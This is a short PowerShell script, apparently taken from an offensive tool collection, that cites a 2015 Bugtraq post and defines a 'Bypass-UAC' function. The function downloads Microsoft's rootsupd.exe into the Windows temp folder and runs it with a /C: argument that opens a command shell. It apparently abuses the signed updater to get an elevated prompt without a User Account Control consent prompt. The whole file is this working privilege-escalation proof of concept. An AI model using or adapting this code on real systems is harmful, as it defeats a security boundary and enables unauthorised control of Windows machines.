# http://seclists.org/bugtraq/2015/Sep/24
function Bypass-UAC () {      
    $fileToDownload = "http://download.windowsupdate.com/msdownload/update/v3/static/trustedr/en/rootsupd.exe" 
    $fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
     
    $webClient = new-object System.Net.WebClient 
    $webClient.DownloadFile($fileToDownload, $fileDownloaded) 
    
    $ok = "D:\GitRepo\PowerMemory\EYLR\rvkroots.exe"
      
    &$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title Follow The White Rabbit ;-)" 
}
